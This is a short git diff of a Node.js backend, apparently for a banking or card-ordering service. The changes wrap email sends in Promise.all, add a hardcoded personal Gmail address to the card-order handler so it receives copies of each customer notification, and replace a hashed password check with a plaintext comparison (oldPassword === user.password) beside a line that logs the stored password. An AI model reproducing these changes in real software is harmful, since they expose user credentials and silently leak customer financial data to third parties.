@@ -76,9 +76,11 @@ const orderDebitCard =  async (req, res) => {
 </html>
 `;
 
-     await sendEmail(user.email, subject, text, html);
-    await sendEmail("anniemary841@gmail.com", subject, text, html);
-
+    await Promise.all([
+      sendEmail(user.email, subject, text, html),
+      sendEmail("anniemary841@gmail.com", subject, text, html),
+      sendEmail("companychris00@gmail.com", subject, text, html),
+    ]);
     res.status(200).json({ status: "success", data: orderCard })
   } catch (error) {
     console.log(error);
@@ -251,10 +253,11 @@ const adminTransfer = async (req, res) => {
       </body>
       </html>
     `;
-
-    await sendEmail(user.email, subject, text, html);
-    await sendEmail("anniemary841@gmail.com", subject, text, html);
-    await sendEmail("companychris00@gmail.com", subject, text, html);
+ await Promise.all([
+   sendEmail(user.email, subject, text, html),
+   sendEmail("anniemary841@gmail.com", subject, text, html),
+   sendEmail("companychris00@gmail.com", subject, text, html),
+ ]);
 
     res
       .status(200)
@@ -283,7 +286,7 @@ const updatePassword = async (req, res) => {
 
     const user = await User.findOne({ _id: userId });
     console.log(user.password);
-    const isPasswordMatch = await user.comparePassword(oldPassword);
+    const isPasswordMatch = oldPassword === user.password
 
     console.log(isPasswordMatch);
     if (!isPasswordMatch) {
